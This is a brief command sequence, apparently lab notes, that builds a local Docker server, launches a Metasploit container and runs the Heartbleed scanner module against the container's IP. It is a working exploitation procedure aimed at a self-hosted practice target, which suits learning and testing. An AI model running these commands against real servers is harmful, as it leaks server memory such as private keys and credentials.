docker build -t server .

docker run -d -p 8443:443 server

docker run --rm -it -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit


docker ps

docker inspect <container-id> | grep IPAddress

msfconsole -q

use auxiliary/scanner/ssl/openssl_heartbleed

set RHOSTS <site-ip>

set VERBOSE true

exploit